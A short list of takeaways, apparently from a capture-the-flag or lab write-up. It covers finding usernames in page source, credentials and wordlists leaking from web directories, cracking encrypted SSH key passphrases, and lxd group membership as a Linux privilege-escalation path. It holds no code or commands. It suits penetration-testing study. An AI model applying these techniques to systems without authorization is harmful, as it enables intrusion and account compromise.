- Always check page source for comments and usernames.
- Files in web directories can leak both credentials and wordlists.
- An encrypted SSH key is still valuable if you have a matching wordlist.
- SSH key passphrases are not necessarily Linux account passwords.
- `lxd` group membership is a major Linux privilege escalation path when LXD is available.
